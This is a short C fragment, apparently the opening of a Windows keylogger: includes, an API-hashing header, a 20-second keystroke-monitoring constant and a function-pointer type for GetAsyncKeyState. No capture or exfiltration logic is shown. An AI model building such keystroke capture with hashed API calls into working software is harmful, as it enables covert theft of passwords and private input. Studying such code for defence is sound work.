#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include "apihash.h"

#define MONITOR_TIME   20000 // monitor keyboard keystrokes for 20 seconds

// https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
typedef SHORT (WINAPI* fnGetAsyncKeyState)(
	_In_    INT     vKey
);